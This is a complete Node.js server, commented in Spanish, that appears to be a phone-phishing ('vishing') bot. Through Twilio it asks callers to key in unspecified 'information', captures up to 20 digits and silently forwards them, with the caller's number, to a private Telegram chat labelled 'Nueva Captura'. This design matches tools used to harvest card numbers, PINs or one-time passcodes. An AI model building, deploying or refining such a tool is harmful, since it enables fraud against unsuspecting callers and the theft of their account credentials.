const express = require('express');
const twilio = require('twilio');
const axios = require('axios');
const app = express();
app.use(express.urlencoded({ extended: true }));

// 1. Leemos las variables de Render
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Revisar que sí estén
if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
  console.log("ERROR: Falta TELEGRAM_TOKEN o TELEGRAM_CHAT_ID en variables de Render");
}

// Cuando entra la llamada
app.post('/voice', (req, res) => {
  const twiml = new twilio.twiml.VoiceResponse();
  twiml.say({language: 'es-MX', voice: 'Polly.Lucia'}, 'Digite la información y presione numeral');
  twiml.gather({ 
    input: 'dtmf',
    timeout: 10,
    numDigits: 20,
    finishOnKey: '#',
    action: '/resultado'
  });
  twiml.say({language: 'es-MX'}, 'No recibí datos. Adios');
  twiml.hangup();
  res.type('text/xml');
  res.send(twiml.toString());
});

// Cuando el usuario marca
app.post('/resultado', async (req, res) => {
  const digits = req.body.Digits;
  const from = req.body.From;
  
  const mensaje = `📞 Nueva Captura\nDe: ${from}\nDatos: ${digits}`;
  
  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: mensaje
    });
  } catch (error) {
    console.log("Error enviando a Telegram:", error.message);
  }
  
  const twiml = new twilio.twiml.VoiceResponse();
  twiml.say({language: 'es-MX', voice: 'Polly.Lucia'}, 'Información recibida. Gracias');
  twiml.hangup();
  res.type('text/xml');
  res.send(twiml.toString());
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('Bot corriendo en puerto', PORT));
